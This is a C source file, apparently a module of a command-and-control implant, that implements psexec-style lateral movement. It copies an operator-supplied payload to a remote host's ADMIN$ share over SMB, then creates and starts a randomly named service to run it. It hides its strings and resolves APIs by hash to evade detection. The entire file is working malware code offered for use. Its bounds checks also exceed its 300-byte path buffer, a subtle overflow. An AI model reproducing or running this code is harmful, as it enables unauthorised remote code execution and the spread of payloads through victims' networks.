#include "config.h"
#ifdef INCLUDE_CMD_PSEXEC

#include "commands.h"
#include "common.h"

// psexec <host> <payload-file>: copy payload to \\host\ADMIN$\<random>.exe over
// SMB using the current thread token (make_token supported), then create and
// start a remote service with a random 8-char name pointing at the binary.
// Port of Starburst cmd_jump_psexec to EmeraldStrike conventions.

typedef SC_HANDLE (WINAPI *fn_OpenSCManagerW)(LPCWSTR, LPCWSTR, DWORD);
typedef SC_HANDLE (WINAPI *fn_CreateServiceW)(SC_HANDLE, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
typedef BOOL      (WINAPI *fn_StartServiceW)(SC_HANDLE, DWORD, LPCWSTR*);
typedef BOOL      (WINAPI *fn_DeleteService)(SC_HANDLE);
typedef BOOL      (WINAPI *fn_CloseServiceHandle)(SC_HANDLE);

// deterministic-enough PRNG seed from instance + pid (no GetTickCount dep)
static DWORD _es_psexec_rand_seed = 0;
static DWORD _es_psexec_rand(PINSTANCE inst) {
    if (!_es_psexec_rand_seed) {
        _es_psexec_rand_seed = (DWORD)(SIZE_T)inst ^ inst->Win32.GetCurrentProcessId() ^ 0x9E3779B9;
    }
    _es_psexec_rand_seed ^= _es_psexec_rand_seed << 13;
    _es_psexec_rand_seed ^= _es_psexec_rand_seed >> 17;
    _es_psexec_rand_seed ^= _es_psexec_rand_seed << 5;
    return _es_psexec_rand_seed;
}

VOID cmd_psexec(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD host_len = 0, payload_len = 0;
    char* host = parser_string(args, &host_len);
    BYTE* payload = parser_bytes(args, &payload_len);
    DWORD delete_after = parser_int32(args);

    if (!host || host_len == 0) {
        package_add_string(inst, response, XSTR("No hostname provided"));
        response->is_error = TRUE;
        return;
    }
    if (!payload || payload_len == 0) {
        package_add_string(inst, response, XSTR("No payload data provided"));
        response->is_error = TRUE;
        return;
    }

    char hostbuf[256] = {0};
    es_memcpy(hostbuf, host, host_len < 255 ? host_len : 255);

    // random 8-char base name (no file/service name collision across runs)
    static const char alphabet[] = {
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p',
        'q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5'
    };
    char rnd[16] = {0};
    for (int i = 0; i < 8; i++) rnd[i] = alphabet[_es_psexec_rand(inst) & 31];
    static const char ext[] = {'.','e','x','e',0};
    for (int i = 0; ext[i]; i++) rnd[8 + i] = ext[i];

    // UNC path \\<host>\ADMIN$\<rnd>
    char unc[300] = {0};
    DWORD u = 0;
    unc[u++] = '\\'; unc[u++] = '\\';
    for (DWORD i = 0; hostbuf[i] && u < 460; i++) unc[u++] = hostbuf[i];
    static const char admin[] = {'\\','A','D','M','I','N','$','\\',0};
    for (int i = 0; admin[i] && u < 480; i++) unc[u++] = admin[i];
    for (int i = 0; rnd[i] && u < 505; i++) unc[u++] = rnd[i];
    unc[u] = 0;

    // remote exec path C:\Windows\<rnd>
    char exec_path[300] = {0};
    DWORD e = 0;
    static const char win[] = {'C',':','\\','W','i','n','d','o','w','s','\\',0};
    for (int i = 0; win[i]; i++) exec_path[e++] = win[i];
    for (int i = 0; rnd[i] && e < 500; i++) exec_path[e++] = rnd[i];
    exec_path[e] = 0;

    // stage payload via SMB (current thread token context)
    HANDLE h_file = inst->Win32.CreateFileA(
        unc, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h_file == INVALID_HANDLE_VALUE) {
        package_add_string(inst, response,
            XSTR("Failed to create file on remote host - check ADMIN$ access"));
        response->is_error = TRUE;
        return;
    }
    DWORD written = 0;
    BOOL write_ok = inst->Win32.WriteFile(h_file, payload, payload_len, &written, NULL);
    inst->Win32.CloseHandle(h_file);
    if (!write_ok || written != payload_len) {
        inst->Win32.DeleteFileA(unc);
        package_add_string(inst, response, XSTR("Failed to write payload to remote host"));
        response->is_error = TRUE;
        return;
    }

    // resolve SCM APIs from advapi32 (loaded at init; LoadLibraryA fallback)
    PVOID advapi = inst->Modules.Advapi32;
    if (!advapi) advapi = (PVOID)inst->Win32.LoadLibraryA(XSTR("advapi32.dll"));
    if (!advapi) {
        inst->Win32.DeleteFileA(unc);
        package_add_string(inst, response, XSTR("Failed to load advapi32"));
        response->is_error = TRUE;
        return;
    }

    fn_OpenSCManagerW      pOpenSCManagerW  = (fn_OpenSCManagerW)resolve_function(advapi, hash_string_djb2(XSTR("OpenSCManagerW")));
    fn_CreateServiceW      pCreateServiceW  = (fn_CreateServiceW)resolve_function(advapi, hash_string_djb2(XSTR("CreateServiceW")));
    fn_StartServiceW       pStartServiceW   = (fn_StartServiceW)resolve_function(advapi, hash_string_djb2(XSTR("StartServiceW")));
    fn_DeleteService       pDeleteService   = (fn_DeleteService)resolve_function(advapi, hash_string_djb2(XSTR("DeleteService")));
    fn_CloseServiceHandle  pCloseSvcH       = (fn_CloseServiceHandle)resolve_function(advapi, hash_string_djb2(XSTR("CloseServiceHandle")));

    if (!pOpenSCManagerW || !pCreateServiceW || !pStartServiceW ||
        !pDeleteService || !pCloseSvcH) {
        inst->Win32.DeleteFileA(unc);
        package_add_string(inst, response, XSTR("Failed to resolve SCM APIs"));
        response->is_error = TRUE;
        return;
    }

    // wide host + UNC for SCM
    wchar_t w_unc[512] = {0};
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, unc, (int)u, w_unc, 511);
    wchar_t w_unc_host[270] = {0};
    w_unc_host[0] = '\\'; w_unc_host[1] = '\\';
    for (DWORD i = 0; hostbuf[i] && i < 256; i++) w_unc_host[i + 2] = (wchar_t)hostbuf[i];

    wchar_t w_svc[64] = {0};
    for (int i = 0; rnd[i] && i < 11 && rnd[i] != '.'; i++) w_svc[i] = (wchar_t)rnd[i];

    wchar_t w_bin[512] = {0};
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, exec_path, (int)e, w_bin, 511);

    SC_HANDLE h_scm = pOpenSCManagerW(w_unc_host, NULL,
        SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!h_scm) {
        inst->Win32.DeleteFileA(unc);
        package_add_string(inst, response,
            XSTR("OpenSCManagerW failed - check perms/network"));
        response->is_error = TRUE;
        return;
    }

    SC_HANDLE h_svc = pCreateServiceW(
        h_scm, w_svc, w_svc, SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
        w_bin, NULL, NULL, NULL, NULL, NULL);
    if (!h_svc) {
        pCloseSvcH(h_scm);
        inst->Win32.DeleteFileA(unc);
        package_add_string(inst, response, XSTR("CreateServiceW failed"));
        response->is_error = TRUE;
        return;
    }

    BOOL started = pStartServiceW(h_svc, 0, NULL);
    DWORD start_err = started ? 0 : inst->Win32.GetLastError();

    BOOL deleted = FALSE;
    if (delete_after) deleted = pDeleteService(h_svc);
    pCloseSvcH(h_svc);
    pCloseSvcH(h_scm);

    // best-effort cleanup of the staged binary (fails silently if service still running)
    inst->Win32.DeleteFileA(unc);

    char out[256] = {0};
    DWORD p = 0;
    static const char ok1[] = {'p','s','e','x','e','c',' ',0};
    for (int i = 0; ok1[i]; i++) out[p++] = ok1[i];
    for (int i = 0; rnd[i]; i++) out[p++] = rnd[i];
    static const char ok2[] = {' ','o','n',' ',0};
    for (int i = 0; ok2[i] && p < 200; i++) out[p++] = ok2[i];
    for (DWORD i = 0; hostbuf[i] && p < 240; i++) out[p++] = hostbuf[i];
    out[p] = 0;

    if (started) {
        if (deleted) {
            static const char s2[] = {' ','(','s','e','r','v','i','c','e',' ','d','e','l','e','t','e','d',')',0};
            DWORD q = es_strlen(out);
            for (int i = 0; s2[i] && q < 250; i++) out[q++] = s2[i];
            out[q] = 0;
        }
        package_add_string(inst, response, out);
    } else if (start_err == 1053) {
        // service did not report back in time - normal for payloads that don't
        // signal SCM (the process still launched)
        package_add_string(inst, response, out);
        package_add_string(inst, response,
            XSTR("StartService timed out (1053) - normal for payload services"));
    } else {
        static const char f[] = {' ','s','t','a','r','t',' ','f','a','i','l','e','d',0};
        DWORD q = es_strlen(out);
        for (int i = 0; f[i] && q < 250; i++) out[q++] = f[i];
        out[q] = 0;
        package_add_string(inst, response, out);
        response->is_error = TRUE;
    }
}

#endif
